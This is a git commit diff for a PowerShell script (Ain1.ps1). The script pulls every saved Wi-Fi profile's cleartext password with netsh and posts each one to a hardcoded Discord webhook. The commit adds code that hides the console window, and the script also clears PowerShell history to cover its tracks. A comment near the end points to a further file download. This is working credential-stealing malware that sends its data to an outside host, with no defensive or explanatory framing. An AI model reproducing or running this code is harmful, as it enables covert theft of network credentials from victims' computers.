cf811e550c23dd5555544e98b7f4dfef3c6c7b99
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-21 12:31:08 +0800

    Update Ain1.ps1

--- WBPV/Ain1.ps1
+++ WBPV/Ain1.ps1
@@ -29,6 +29,8 @@ Add-Type @"
 
 # ENG
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    [ConsoleWindow]::Hide()
+
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
@@ -39,12 +41,12 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
-	
 }
 
 # Clear the PowerShell command history
 Clear-History
 
+[ConsoleWindow]::Hide()
 ###############################################################################
 
 # Define the URL of the file to be downloaded
